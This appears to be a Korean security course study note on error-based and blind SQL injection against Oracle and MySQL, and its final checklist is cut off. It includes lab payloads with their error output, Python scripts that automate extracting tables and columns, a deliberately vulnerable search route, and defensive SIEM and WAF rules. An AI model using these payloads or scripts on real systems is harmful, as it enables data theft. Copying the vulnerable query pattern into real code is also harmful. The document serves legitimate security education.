# 📄 2025.01.29 (Day 64) - Error-based SQL Injection

---

## 1. 핵심 개념 정리

### Error-based SQL Injection 기본 원리

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 1 | Error-based SQL Injection 정의 | 의도적으로 SQL 에러를 유발하여 에러 메시지 내에 쿼리 결과를 포함시키는 공격 기법 | Union-based가 불가능한 환경에서 효과적이며, 에러 메시지 노출 설정이 잘못된 시스템에 치명적 |
| 2 | 에러 메시지 활용 | DB 에러 메시지에 서브쿼리 결과가 포함되어 출력됨 | 개발 환경의 상세 에러 메시지가 운영 환경에 그대로 노출되는 경우 취약 |
| 3 | 1 Row, 1 Column 제약 | 한 번에 하나의 행, 하나의 컬럼만 추출 가능 | Union-based보다 느리지만 탐지 회피 가능성이 높음 |
| 4 | DBMS별 에러 함수 | Oracle: CTXSYS.DRITHSX.SN, MySQL: extractvalue, updatexml 등 | DBMS별로 고유한 에러 유발 함수를 악용 |
| 5 | 서브쿼리 중첩 | 에러 유발 함수의 인자로 서브쿼리를 전달하여 결과 추출 | 복잡한 서브쿼리 구조로 WAF 우회 가능 |

### Oracle Error-based SQL Injection

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 6 | CTXSYS.DRITHSX.SN 함수 | Oracle Text의 시소러스 관련 함수로, 존재하지 않는 키워드 사전 조회 시 에러 발생 | 시스템 스키마 함수 실행 권한이 있는 경우 악용 가능 |
| 7 | 에러 메시지 구조 | DRG-11701: [데이터] 키워드 사전이 존재하지 않습니다 | 에러 메시지에 서브쿼리 결과가 그대로 노출됨 |
| 8 | ROWNUM을 이용한 순차 추출 | 한 번에 하나의 행만 추출하므로 ROWNUM으로 행 번호 지정 | WHERE r=1, r=2, ... 순차적으로 반복하여 모든 데이터 추출 |
| 9 | LISTAGG 함수 활용 | 여러 행을 하나의 문자열로 결합하여 한 번에 추출 | 컬럼명이 많을 때 효율적이지만 문자열 길이 제한 존재 |
| 10 | CONCAT 함수 활용 | 여러 컬럼을 하나의 문자열로 결합 | 이름, 이메일, 비밀번호 등을 한 번에 추출 가능 |

### MySQL Error-based SQL Injection

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 11 | extractvalue 함수 | XML 데이터에서 값을 추출하는 함수로, 잘못된 XPath 경로 입력 시 에러 발생 | XPATH syntax error에 서브쿼리 결과 포함 |
| 12 | concat과 0x3a 활용 | 콜론(:)을 16진수(0x3a)로 표현하여 잘못된 XPath 경로 생성 | 콜론으로 시작하는 경로는 유효하지 않아 에러 발생 |
| 13 | updatexml 함수 | extractvalue와 유사하게 XML 업데이트 함수로 에러 유발 | 두 함수 모두 사용 가능하므로 하나가 차단되면 다른 것 사용 |
| 14 | LIMIT을 이용한 순차 추출 | MySQL은 LIMIT 구문으로 특정 행 선택 | LIMIT 0,1 → LIMIT 1,1 → LIMIT 2,1 순차 반복 |
| 15 | 에러 메시지 길이 제한 | extractvalue는 결과값이 32자까지만 출력됨 | 긴 데이터는 substring으로 분할하여 추출 필요 |

---

## 2. 실습 내용 정리

### 실습 64-1: Oracle Error-based SQL Injection 기초

**목표:** CTXSYS.DRITHSX.SN 함수를 이용한 에러 기반 데이터 추출 기법 학습

**실습 환경:**
- 대상: Oracle 기반 친구 검색 시스템
- 취약점: 검색어 입력값이 LIKE 쿼리에 직접 삽입
- 조건: 에러 메시지가 화면에 상세히 노출됨

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT name, addr, hobby, age FROM friends WHERE name LIKE '%검색어%'

# 2. 공격 포인트 파악
검색어: '
→ 에러 발생 확인 (SQL Injection 취약점 존재)
→ 에러 메시지가 상세하게 노출됨 (WAS 내부 에러)

# 3. 에러 유발 함수 테스트
검색어: 김%' and CTXSYS.DRITHSX.SN(user,'hacker') ='j

→ 에러 메시지:
ORA-20000: Oracle Text 오류:
DRG-11701: hacker 키워드 사전이 존재하지 않습니다
ORA-06512: "CTXSYS.DRUE", 192행

# 4. 서브쿼리로 현재 사용자 확인
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select user from dual)) ='j

→ 에러 메시지:
DRG-11701: RICHMAN 키워드 사전이 존재하지 않습니다
→ 현재 DB 사용자: RICHMAN

# 5. 테이블 개수 확인
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables)) ='j

→ 에러 메시지:
DRG-11701: 2 키워드 사전이 존재하지 않습니다
→ 테이블 개수: 2개

# 6. 첫 번째 테이블명 추출
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select j from (select table_name j, rownum k from user_tables) where k = 1)) ='j

→ 에러 메시지:
DRG-11701: FRIENDS 키워드 사전이 존재하지 않습니다
→ 첫 번째 테이블: FRIENDS

# 7. 두 번째 테이블명 추출
검색어: 김%' and CTXSYS.DRITHSX.SN(user,(select j from (select table_name j, rownum k from user_tables) where k = 2)) ='j

→ 에러 메시지:
DRG-11701: MEMBERS 키워드 사전이 존재하지 않습니다
→ 두 번째 테이블: MEMBERS
```

**CTXSYS.DRITHSX.SN 함수 메커니즘:**
```
동작 원리:
1. CTXSYS.DRITHSX.SN(user, '키워드')
   - Oracle Text의 시소러스 관련 함수
   - 두 번째 인자를 키워드 사전(thesaurus) 이름으로 인식

2. 존재하지 않는 키워드 사전 조회 시 에러 발생
   - DRG-11701: [키워드] 키워드 사전이 존재하지 않습니다

3. 서브쿼리 결과를 두 번째 인자로 전달
   - CTXSYS.DRITHSX.SN(user, (select user from dual))
   - 서브쿼리 결과 'RICHMAN'이 키워드 사전 이름으로 처리됨
   - 에러 메시지에 'RICHMAN'이 포함되어 출력

제약사항:
- 1 Row, 1 Column만 반환해야 함
- 다중 행 반환 시 ORA-01427 에러 발생
```

**보안 인사이트:**
- 에러 메시지가 상세하게 노출되면 DB 구조와 데이터를 완전히 탈취당할 수 있음
- CTXSYS 같은 시스템 스키마 함수 실행 권한을 웹 애플리케이션 계정에서 제거 필수
- 에러 메시지는 로그에만 기록하고 사용자에게는 일반화된 메시지만 표시

### 실습 64-2: Oracle Error-based SQL Injection - 게시판 문제 (문제 6번)

**목표:** 게시판 검색 기능에서 Error-based SQL Injection으로 특정 테이블의 데이터 탈취

**실습 환경:**
- 대상: Oracle 기반 게시판 시스템
- 취약점: 게시판 검색창에 입력값 직접 삽입
- 쿼리 구조: `SELECT 제목, 작성자, 조회수 FROM 게시판 WHERE 제목 LIKE '%검색어%'`

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT * FROM BOARD WHERE CONTENT LIKE '%'||'입력값'||'%'

# 2. 공격 포인트 파악
검색어: '
→ Java 에러 발생
→ Oracle DB 에러 메시지가 화면에 직접 노출됨

# 3. 에러 유발 함수 테스트
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,'hacker') ='j
→ 에러 발생 확인

# 4. 현재 사용자 확인
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,(select user from dual)) ='j
→ 현재 사용자 확인

# 5. 테이블 개수 확인
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables)) ='j

→ 에러 메시지:
DRG-11701: 6 키워드 사전이 존재하지 않습니다
→ 테이블 개수: 6개

# 6. 테이블명 순차 추출
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,(select a from (select table_name a, rownum b from user_tables) where b = 1)) ='j

→ 테이블 목록:
1: BOARD
2: COMM_FILE
3: COMM_MDI_FILE
4: MEMBER
5: EQST_ANSWER
6: ZIPCODE

# 7. EQST_ANSWER 테이블의 컬럼 개수 확인
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,(select count(column_name) from user_tab_columns where table_name = 'EQST_ANSWER')) ='j

→ 컬럼 개수 확인

# 8. EQST_ANSWER 테이블의 컬럼명 추출
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,(select column_name from (select rownum as r, column_name from user_tab_columns where table_name='EQST_ANSWER') where r=1)) ='j

→ 결과: ANSWER_COLUMN

# 9. LISTAGG 함수로 여러 컬럼명 한 번에 추출 (선택적)
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,(select LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY 1) from user_tab_columns where table_name = 'EQST_ANSWER')) ='j

→ 결과: ANSWER_COLUMN, REG_ACCT_ID, REG_DT, ...

# 10. 최종 데이터 추출
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,(select ANSWER_COLUMN from (select rownum as r, ANSWER_COLUMN from EQST_ANSWER) where r=1)) ='j

→ 에러 메시지:
DRG-11701: skinfosec_eqst_lms_system 키워드 사전이 존재하지 않습니다

→ 정답: skinfosec_eqst_lms_system
```

**ROWNUM을 이용한 순차 추출:**
```sql
# ROWNUM 활용 패턴
SELECT 컬럼 FROM (
    SELECT 컬럼, ROWNUM as r 
    FROM 테이블
) WHERE r = 행번호

# 예시: 두 번째 테이블명 추출
SELECT a FROM (
    SELECT table_name a, ROWNUM b 
    FROM user_tables
) WHERE b = 2

# 에러 기반 SQL Injection에 적용:
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,(
    select a from (
        select table_name a, rownum b from user_tables
    ) where b = 2
)) ='j

# 장점:
- 순차적으로 모든 행을 추출 가능
- WHERE b = 1, b = 2, b = 3, ... 반복

# 단점:
- 한 번에 하나씩만 추출 가능 (느림)
- 반복 횟수가 많아 로그에 패턴 노출
```

**LISTAGG 함수 활용:**
```sql
# LISTAGG 함수 문법
SELECT LISTAGG(컬럼명, '구분자') WITHIN GROUP (ORDER BY 정렬기준)
FROM 테이블

# 예시: 모든 컬럼명을 쉼표로 구분하여 하나의 문자열로
SELECT LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY 1)
FROM user_tab_columns
WHERE table_name = 'MEMBER'

→ 결과: USER_NM, LOGIN_ID, PASS, EMAIL, PHONE

# Error-based SQL Injection에 적용:
검색어: qwe%' and CTXSYS.DRITHSX.SN(user,(
    select LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY 1) 
    from user_tab_columns 
    where table_name = 'MEMBER'
)) ='j

→ 에러 메시지에 모든 컬럼명이 한 번에 출력됨

# 장점:
- 여러 행을 한 번에 추출 가능 (빠름)
- 반복 횟수 감소로 탐지 회피

# 단점:
- 문자열 길이 제한 (4000자)
- 데이터가 많으면 잘림
```

**보안 고려사항:**
```
탐지 포인트:
- CTXSYS.DRITHSX.SN 함수 호출 로그
- DRG-11701 에러 반복 발생 (동일 IP)
- user_tables, user_tab_columns 조회 패턴
- ROWNUM을 이용한 순차 접근 (WHERE r=1, r=2, r=3, ...)

방어 방법:
→ 에러 메시지 상세 정보 노출 차단 (일반화된 에러 페이지)
→ CTXSYS 시스템 스키마 함수 실행 권한 제거
→ WAF에서 CTXSYS, DRITHSX 키워드 탐지 및 차단
→ Rate Limiting으로 반복 시도 차단
```

### 실습 64-3: MySQL Error-based SQL Injection - extractvalue 함수 (문제 6번)

**목표:** MySQL의 extractvalue 함수를 이용한 Error-based SQL Injection

**실습 환경:**
- 대상: MySQL 기반 게시판 시스템
- 취약점: 게시판 검색창에 입력값 직접 삽입
- 쿼리 구조: `SELECT * FROM BOARD WHERE TITLE LIKE '%입력값%' OR CONTENT LIKE '%입력값%'`

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT * FROM BOARD WHERE ... AND (TITLE LIKE '%입력값%' OR CONTENT LIKE '%입력값%')

# 2. 공격 포인트 파악
검색어: '
→ XPATH syntax error 발생
→ XML 관련 함수를 이용한 Error-Based SQL Injection 가능

# 3. extractvalue 함수 테스트
검색어: CCC%' and extractvalue('1', concat(0x3a, (select 'hacker2')))='j%

→ XPATH syntax error: ':hacker2'
→ 0x3a는 콜론(:)의 16진수 표현
→ 콜론으로 시작하는 XPath 경로는 유효하지 않아 에러 발생

# 4. 테이블 개수 확인
검색어: CCC%' and extractvalue('1', concat(0x3a, (select count(table_name) from information_schema.tables where table_schema = database())))='j%

→ XPATH syntax error: ':5'
→ 테이블 개수: 5개

# 5. 첫 번째 테이블명 추출
검색어: CCC%' and extractvalue('1', concat(0x3a, (select table_name from information_schema.tables where table_schema = database() limit 0,1)))='j%

→ XPATH syntax error: ':board'
→ 첫 번째 테이블: board

# 6. 테이블명 순차 추출
검색어: CCC%' and extractvalue('1', concat(0x3a, (select table_name from information_schema.tables where table_schema = database() limit 1,1)))='j%

→ 테이블 목록:
limit 0,1: board
limit 1,1: comm_file
limit 2,1: member
limit 3,1: eqst_answer
limit 4,1: zipcode

# 7. eqst_answer 테이블의 컬럼명 확인
검색어: CCC%' and extractvalue(1, concat(0x3a, (select column_name from information_schema.columns where table_name='eqst_answer' limit 0,1))) and '1'='1

→ XPATH syntax error: ':answer_column'
→ 컬럼명: answer_column

# 8. 최종 데이터 추출
검색어: qwe%' and extractvalue(1, concat(0x3a, (select answer_column from eqst_answer limit 0,1))) and '1'='1

→ XPATH syntax error: ':skinfosec_eqst_lms_system'

→ 정답: skinfosec_eqst_lms_system
```

**extractvalue 함수 메커니즘:**
```
함수 구조:
extractvalue(xml_document, xpath_expression)

정상 사용 예시:
SELECT extractvalue('<root><name>test</name></root>', '/root/name');
→ 결과: test

Error-based SQL Injection 활용:
extractvalue('1', concat(0x3a, (select user())))
               ↑         ↑              ↑
            XML 문서   콜론(:)   서브쿼리 결과

동작 과정:
1. concat(0x3a, (select user()))
   - 0x3a: 콜론(:)의 16진수
   - 서브쿼리 결과: root
   - concat 결과: :root

2. extractvalue('1', ':root')
   - ':root'는 유효하지 않은 XPath 경로
   - 에러 발생: XPATH syntax error: ':root'

3. 에러 메시지에 서브쿼리 결과 포함
   - ':root' 부분에 추출하려는 데이터가 노출됨
```

**LIMIT를 이용한 순차 추출:**
```sql
# MySQL LIMIT 구문
SELECT 컬럼 FROM 테이블 LIMIT 시작위치, 개수

# 예시:
LIMIT 0,1  -- 첫 번째 행
LIMIT 1,1  -- 두 번째 행
LIMIT 2,1  -- 세 번째 행
LIMIT 4,1  -- 다섯 번째 행

# Error-based SQL Injection에 적용:
# 첫 번째 테이블
CCC%' and extractvalue(1, concat(0x3a, (
    select table_name from information_schema.tables 
    where table_schema=database() 
    limit 0,1
))) and '1'='1

# 두 번째 테이블
CCC%' and extractvalue(1, concat(0x3a, (
    select table_name from information_schema.tables 
    where table_schema=database() 
    limit 1,1
))) and '1'='1

# 자동화 시:
for i in range(0, 10):
    payload = f"limit {i},1"
```

**extractvalue vs updatexml:**
```sql
# extractvalue 함수
extractvalue(xml_document, xpath_expression)

검색어: test%' and extractvalue(1, concat(0x3a, (select user()))) and '1'='1
→ XPATH syntax error: ':root@localhost'

# updatexml 함수
updatexml(xml_document, xpath_expression, new_value)

검색어: test%' and updatexml(1, concat(0x3a, (select user())), 1) and '1'='1
→ XPATH syntax error: ':root@localhost'

# 차이점:
- extractvalue: 2개 인자
- updatexml: 3개 인자
- 동작 원리는 동일
- 하나가 차단되면 다른 것 사용 가능

# 선택 기준:
- extractvalue가 더 간결하여 선호됨
- 일부 WAF에서 extractvalue만 차단하는 경우 updatexml 사용
```

**에러 메시지 길이 제한:**
```
extractvalue 제약사항:
- 에러 메시지는 최대 32자까지만 출력됨
- 긴 데이터는 잘려서 표시됨

해결 방법 1: substring으로 분할
검색어: test%' and extractvalue(1, concat(0x3a, 
    (select substring(data, 1, 30) from table)
)) and '1'='1
→ 1~30번째 문자

검색어: test%' and extractvalue(1, concat(0x3a, 
    (select substring(data, 31, 30) from table)
)) and '1'='1
→ 31~60번째 문자

해결 방법 2: Union-based나 Blind로 전환
- 32자 제한 없이 전체 데이터 추출 가능
```

**보안 고려사항:**
```
탐지 포인트:
- extractvalue, updatexml 함수 사용
- XPATH syntax error 반복 발생
- information_schema 접근 패턴
- concat(0x3a, ...) 패턴
- LIMIT 순차 증가 패턴

방어 방법:
→ 에러 메시지 상세 정보 노출 차단
→ extractvalue, updatexml 함수 사용 제한
→ WAF에서 0x3a, concat 패턴 탐지
→ Prepared Statement 사용 (근본적 해결)
```

### 실습 64-4: Oracle Blind SQL Injection 기초 (문제 4번)

**목표:** 쿼리 결과가 직접 노출되지 않는 환경에서 참/거짓 차이를 이용한 데이터 추출

**실습 환경:**
- 대상: Oracle 기반 게시판 검색 시스템
- 조건: 쿼리 결과가 화면에 직접 출력되지 않음
- 참/거짓 차이: 게시물 표시 여부

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT 컬럼들 FROM 게시판 WHERE 제목 LIKE '%검색어%'

# 2. 공격 포인트 파악
검색어: 523%' and (공격쿼리) > 0 and 'k%'='k
→ 조건이 참이면 게시물 표시
→ 조건이 거짓이면 게시물 미표시

# 3. DB 사용자명 길이 확인
검색어: 523%' and (select length(user) from dual) = 4 and 'k%'='k
→ 게시물 표시됨
→ user 길이: 4글자

검색어: 523%' and (select length(user) from dual) = 5 and 'k%'='k
→ 게시물 표시 안됨
→ user 길이가 5가 아님을 확인

# 4. 첫 번째 글자 ASCII 값 추출 (이진 탐색)
검색어: 523%' and (select ascii(substr(user,1,1)) from dual) > 83 and 'k%'='k
→ 게시물 표시 안됨
→ 첫 번째 글자 ASCII 값은 83 이하

검색어: 523%' and (select ascii(substr(user,1,1)) from dual) > 73 and 'k%'='k
→ 게시물 표시 안됨
→ 첫 번째 글자 ASCII 값은 73 이하

검색어: 523%' and (select ascii(substr(user,1,1)) from dual) = 73 and 'k%'='k
→ 게시물 표시됨
→ 첫 번째 글자: 'I' (ASCII 73)

# 5. 두 번째 글자 추출
검색어: 523%' and (select ascii(substr(user,2,1)) from dual) > 78 and 'k%'='k
→ 이진 탐색으로 ASCII 값 특정
→ 두 번째 글자: 'N' (ASCII 78)

# 6. 세 번째 글자 추출
검색어: 523%' and (select ascii(substr(user,3,1)) from dual) > 70 and 'k%'='k
→ 세 번째 글자: 'F' (ASCII 70)

# 7. 네 번째 글자 추출
검색어: 523%' and (select ascii(substr(user,4,1)) from dual) > 54 and 'k%'='k
→ 네 번째 글자: '6' (ASCII 54)

# 8. 최종 결과
→ user = INF6
→ 정답: INF6
```

**Blind SQL Injection 원리 (복습):**
```
핵심 메커니즘:
1. 쿼리 결과가 직접 출력되지 않음
2. 참/거짓 조건에 따라 화면 출력이 달라짐
3. 이를 이용하여 한 글자씩 데이터 추출

실행되는 쿼리:
SELECT 컬럼들 FROM 게시판 
WHERE 제목 LIKE '%523%' 
    and (select length(user) from dual) = 4 
    and 'k%'='k%'

조건 평가:
- length(user) = 4가 참이면:
  WHERE 제목 LIKE '%523%' and TRUE and TRUE
  → 검색 결과 표시

- length(user) = 4가 거짓이면:
  WHERE 제목 LIKE '%523%' and FALSE and TRUE
  → 검색 결과 없음
```

**이진 탐색 적용 (복습):**
```
ASCII 코드 범위: 0 ~ 127

1단계: 중간값 64와 비교
검색어: test%' and ascii(substr(user,1,1)) > 64 and '1%'='1
→ 게시물 표시 → 64보다 큼 → 범위: 65~127

2단계: 새 중간값 96과 비교
검색어: test%' and ascii(substr(user,1,1)) > 96 and '1%'='1
→ 게시물 표시 안됨 → 96 이하 → 범위: 65~96

3단계: 새 중간값 80과 비교
검색어: test%' and ascii(substr(user,1,1)) > 80 and '1%'='1
→ 게시물 표시 안됨 → 80 이하 → 범위: 65~80

4단계: 범위를 계속 좁혀감
→ 최종적으로 정확한 ASCII 값 특정

실제 풀이에서:
- 첫 번째 글자: ASCII 73 = 'I'
- 두 번째 글자: ASCII 78 = 'N'
- 세 번째 글자: ASCII 70 = 'F'
- 네 번째 글자: ASCII 54 = '6'
→ 결과: INF6
```

---

## 3. DBMS별 Error-based SQL Injection 비교표

### Oracle vs MySQL Error 함수 비교

| 항목 | Oracle | MySQL | 비고 |
|:---:|:---|:---|:---|
| **에러 유발 함수** | CTXSYS.DRITHSX.SN | extractvalue, updatexml | DBMS별 고유 함수 악용 |
| **에러 메시지 패턴** | DRG-11701: [데이터] 키워드 사전이 존재하지 않습니다 | XPATH syntax error: ':[데이터]' | 에러 메시지에 서브쿼리 결과 포함 |
| **순차 추출 방법** | ROWNUM | LIMIT | 한 번에 하나씩 추출 |
| **문자열 결합** | CONCAT, `||`, LISTAGG | CONCAT, `||` (MySQL 8.0+) | 여러 컬럼을 하나로 합침 |
| **에러 메시지 길이** | 제한 없음 | 32자 제한 | MySQL은 substring으로 분할 필요 |
| **필요 권한** | CTXSYS 스키마 함수 실행 권한 | extractvalue 함수 사용 권한 | 권한 제거로 방어 가능 |

### SQL Injection 공격 유형별 특징 정리

| 공격 유형 | 추출 단위 | 속도 | 탐지 난이도 | 실무 빈도 | 주요 제약사항 |
|:---|:---|:---|:---|:---|:---|
| **Union-based** | 여러 Row, 여러 Column | 빠름 | 중간 | 0.1% | 쿼리 결과가 화면에 출력되어야 함 |
| **Error-based** | 1 Row, 1 Column | 느림 | 낮음 | 중간 | 에러 메시지가 상세히 노출되어야 함 |
| **Blind SQL Injection** | 1 Row, 1 Column, 1 Char | 매우 느림 | 높음 | 높음 | 참/거짓 응답 차이 필요 |
| **Time-based** | 1 Row, 1 Column, 1 Char | 매우 느림 | 매우 높음 | 높음 | 응답 시간 차이로만 판별 |

---

## 4. 심화 분석

### Error-based SQL Injection 자동화

```python
# [Oracle Error-based SQL Injection 자동화 스크립트]
import requests
import re

def oracle_error_based_sqli(url, param_name, target_table):
    """
    Oracle Error-based SQL Injection 자동화
    CTXSYS.DRITHSX.SN 함수 사용
    """
    results = []
    
    # 1. 테이블 개수 확인
    payload = f"qwe%' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables)) ='j"
    params = {param_name: payload}
    response = requests.get(url, params=params)
    
    # 에러 메시지에서 개수 추출
    match = re.search(r'DRG-11701: (\d+)', response.text)
    if match:
        table_count = int(match.group(1))
        print(f"테이블 개수: {table_count}")
    
    # 2. 테이블명 순차 추출
    for i in range(1, table_count + 1):
        payload = f"qwe%' and CTXSYS.DRITHSX.SN(user,(select a from (select table_name a, rownum b from user_tables) where b = {i})) ='j"
        params = {param_name: payload}
        response = requests.get(url, params=params)
        
        # 에러 메시지에서 테이블명 추출
        match = re.search(r'DRG-11701: (\w+)', response.text)
        if match:
            table_name = match.group(1)
            print(f"{i}. {table_name}")
            
            if table_name == target_table:
                # 3. 목표 테이블의 컬럼명 추출
                return extract_columns(url, param_name, target_table)
    
    return results

def extract_columns(url, param_name, table_name):
    """
    특정 테이블의 컬럼명 추출
    """
    # LISTAGG 함수로 모든 컬럼명 한 번에 추출
    payload = f"qwe%' and CTXSYS.DRITHSX.SN(user,(select LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY 1) from user_tab_columns where table_name = '{table_name}')) ='j"
    params = {param_name: payload}
    response = requests.get(url, params=params)
    
    # 에러 메시지에서 컬럼명 추출
    match = re.search(r'DRG-11701: (.+?) 키워드', response.text)
    if match:
        columns = match.group(1)
        print(f"컬럼명: {columns}")
        return columns.split(', ')
    
    return []

# 사용 예시
url = "http://target.com/board/search"
param_name = "keyword"
target_table = "EQST_ANSWER"

columns = oracle_error_based_sqli(url, param_name, target_table)
```

```python
# [MySQL Error-based SQL Injection 자동화 스크립트]
import requests
import re

def mysql_error_based_sqli(url, param_name, target_db):
    """
    MySQL Error-based SQL Injection 자동화
    extractvalue 함수 사용
    """
    results = []
    
    # 1. 테이블 개수 확인
    payload = f"test%' and extractvalue(1, concat(0x3a, (select count(table_name) from information_schema.tables where table_schema='{target_db}'))) and '1'='1"
    params = {param_name: payload}
    response = requests.get(url, params=params)
    
    # 에러 메시지에서 개수 추출
    match = re.search(r"XPATH syntax error: ':(\d+)'", response.text)
    if match:
        table_count = int(match.group(1))
        print(f"테이블 개수: {table_count}")
    
    # 2. 테이블명 순차 추출
    for i in range(0, table_count):
        payload = f"test%' and extractvalue(1, concat(0x3a, (select table_name from information_schema.tables where table_schema='{target_db}' limit {i},1))) and '1'='1"
        params = {param_name: payload}
        response = requests.get(url, params=params)
        
        # 에러 메시지에서 테이블명 추출
        match = re.search(r"XPATH syntax error: ':(\w+)'", response.text)
        if match:
            table_name = match.group(1)
            print(f"{i+1}. {table_name}")
            results.append(table_name)
    
    return results

# 사용 예시
url = "http://target.com/board/search"
param_name = "keyword"
target_db = "testdb"

tables = mysql_error_based_sqli(url, param_name, target_db)
```

### 공격 시나리오 비교

```python
# [취약한 게시판 검색 코드]
@app.route("/board/search")
def search():
    keyword = request.args.get('keyword')
    
    # 입력값을 직접 쿼리에 삽입 (취약)
    query = f"SELECT title, content, author FROM board WHERE title LIKE '%{keyword}%'"
    
    try:
        result = db.execute(query)
        return render_template('board.html', posts=result)
    except Exception as e:
        # 에러 메시지를 그대로 출력 (매우 위험!)
        return f"Error: {str(e)}", 500


# [공격 예시 1: Oracle Error-based]
# 사용자 입력: qwe%' and CTXSYS.DRITHSX.SN(user,(select user from dual)) ='j
# 실행되는 쿼리:
# SELECT title, content, author FROM board 
# WHERE title LIKE '%qwe%' and CTXSYS.DRITHSX.SN(user,(select user from dual)) ='j%'
# 에러 발생:
# ORA-20000: Oracle Text 오류:
# DRG-11701: RICHMAN 키워드 사전이 존재하지 않습니다
# 결과: 현재 DB 사용자명 'RICHMAN' 노출


# [공격 예시 2: MySQL Error-based]
# 사용자 입력: test%' and extractvalue(1, concat(0x3a, (select user()))) and '1'='1
# 실행되는 쿼리:
# SELECT title, content, author FROM board 
# WHERE title LIKE '%test%' and extractvalue(1, concat(0x3a, (select user()))) and '1'='1%'
# 에러 발생:
# XPATH syntax error: ':root@localhost'
# 결과: 현재 사용자 'root@localhost' 노출


# [방어 코드 - Prepared Statement + 에러 처리]
@app.route("/board/search")
def search():
    keyword = request.args.get('keyword')
    
    # Parameterized Query 사용 (안전)
    query = "SELECT title, content, author FROM board WHERE title LIKE ?"
    
    try:
        result = db.execute(query, (f'%{keyword}%',))
        return render_template('board.html', posts=result)
    except Exception as e:
        # 에러는 로그에만 기록
        logger.error(f"DB Error: {e}")
        # 사용자에게는 일반화된 메시지만 표시
        return "검색 중 오류가 발생했습니다.", 500

# 설명:
# - Prepared Statement로 SQL Injection 원천 차단
# - 에러 메시지를 사용자에게 직접 노출하지 않음
# - 상세 에러는 서버 로그에만 기록
```

---

## 5. 실무/보안 적용

### 보안 전문가 관점 - Error-based SQL Injection 탐지 및 대응

| 단계/유형 | 탐지 포인트 | 로그 예시 | 대응 방안 |
|:---:|:---|:---|:---|
| **Oracle Error-based** | - CTXSYS, DRITHSX 키워드 포함<br>- DRG-11701 에러 반복 발생<br>- user_tables, user_tab_columns 조회<br>- ROWNUM, LISTAGG 함수 사용 | `qwe%27+and+CTXSYS.DRITHSX.SN`<br>`DRG-11701 에러 10회 연속`<br>`select+rownum+from+user_tables` | - 즉시 해당 세션 차단<br>- CTXSYS 스키마 함수 실행 권한 제거<br>- WAF에서 CTXSYS 키워드 차단<br>- 에러 메시지 필터링 |
| **MySQL Error-based** | - extractvalue, updatexml 함수 사용<br>- XPATH syntax error 반복<br>- concat(0x3a, ...) 패턴<br>- information_schema 접근 | `extractvalue(1,concat(0x3a`<br>`XPATH syntax error 발생`<br>`select+from+information_schema` | - extractvalue/updatexml 사용 제한<br>- 0x3a (콜론) 패턴 탐지<br>- information_schema 접근 제한<br>- 에러 메시지 일반화 |
| **반복 패턴 탐지** | - 동일 IP에서 ROWNUM 순차 증가<br>- LIMIT 값 순차 증가<br>- 5분 내 20회 이상 에러 발생 | `where r=1`, `where r=2`, ...`<br>`limit 0,1`, `limit 1,1`, ... | - Rate Limiting 강화<br>- IP 블랙리스트 등록<br>- CAPTCHA 도입<br>- 침해사고 대응팀 알림 |

### SIEM 탐지 룰 예시

```spl
# Splunk - Oracle Error-based SQL Injection 탐지
index=web_logs
| rex field=uri "(?<oracle_error_func>CTXSYS|DRITHSX|ORDSYS)"
| rex field=response_body "DRG-11701"
| stats count by src_ip, oracle_error_func
| where count > 5
| eval severity="critical"
| table src_ip, oracle_error_func, count, severity

# Splunk - MySQL Error-based SQL Injection 탐지
index=web_logs
| rex field=uri "(?<mysql_error_func>extractvalue|updatexml)"
| rex field=uri "0x3a"
| rex field=response_body "XPATH syntax error"
| stats count by src_ip, mysql_error_func
| where count > 5
| eval severity="critical"
| table src_ip, mysql_error_func, count, severity

# Splunk - Error-based 순차 추출 패턴 탐지
index=web_logs
| rex field=uri "rownum.*?=\s*(?<row_num>\d+)"
| rex field=uri "limit\s+(?<limit_offset>\d+),1"
| stats count values(row_num) as row_numbers values(limit_offset) as limit_offsets by src_ip
| where count > 10
| eval severity="high"
| table src_ip, row_numbers, limit_offsets, count, severity
```

### WAF 룰셋 예시

```bash
# ModSecurity (WAF) Rule

# Rule 1: Oracle Error-based 함수 탐지
SecRule ARGS "@rx (CTXSYS|DRITHSX|ORDSYS|ORD_DICOM)" \
    "id:2001,phase:2,deny,status:403,msg:'Oracle Error-based SQL Injection Detected'"

# Rule 2: MySQL Error-based 함수 탐지
SecRule ARGS "@rx (extractvalue|updatexml)" \
    "id:2002,phase:2,deny,status:403,msg:'MySQL Error-based SQL Injection Detected'"

# Rule 3: 0x3a (콜론) 패턴 탐지
SecRule ARGS "@rx (0x3a|concat\(0x)" \
    "id:2003,phase:2,deny,status:403,msg:'Hexadecimal Colon Pattern Detected'"

# Rule 4: ROWNUM 순차 접근 탐지
SecRule ARGS "@rx (rownum\s*=\s*\d+)" \
    "id:2004,phase:2,deny,status:403,msg:'ROWNUM Sequential Access Detected'"

# Rule 5: LISTAGG 함수 탐지
SecRule ARGS "@rx (LISTAGG\()" \
    "id:2005,phase:2,deny,status:403,msg:'LISTAGG Function Detected'"
```

### 보안 설정 체크리스트

```bash
# Error-based SQL Injection 방어 체크리스트

# 1. 에러 메시지 설정
# 개발 환경
display_errors = On
error_reporting = E_ALL
# 에러 상세 정보 표시 (디버깅용)

# 운영 환경
display_errors = Off
